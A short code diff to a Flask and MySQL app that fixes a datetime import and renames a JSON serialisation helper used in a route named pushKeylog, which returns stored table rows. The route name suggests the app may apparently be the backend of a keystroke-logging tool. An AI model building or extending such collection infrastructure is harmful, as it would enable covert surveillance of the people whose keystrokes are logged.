@@ -3,6 +3,7 @@ import json
 from json import JSONEncoder
 import mysql.connector
 import os
+from datetime import datetime
 
 #start flask app
 app = Flask(__name__, template_folder='templates')
@@ -17,8 +18,8 @@ def load_cfg(path):
         print("Exception: ", e)
     return jsonres
     
-def datetime_convertor(o):
-  if isinstance(o,datetime.datetime):
+def datetime_converter(o):
+  if isinstance(o,datetime):
       return o.__str__()
     
 @app.route('/')
@@ -86,7 +87,7 @@ def pushKeylog():
   sql = f"SELECT * FROM {main_cfg['dbTable']}"
   mycursor.execute(sql)
   
-  res = json.dumps(mycursor.fetchall(), default=datetime_convertor)
+  res = json.dumps(mycursor.fetchall(), default=datetime_converter)
   print(res)
 
   return res
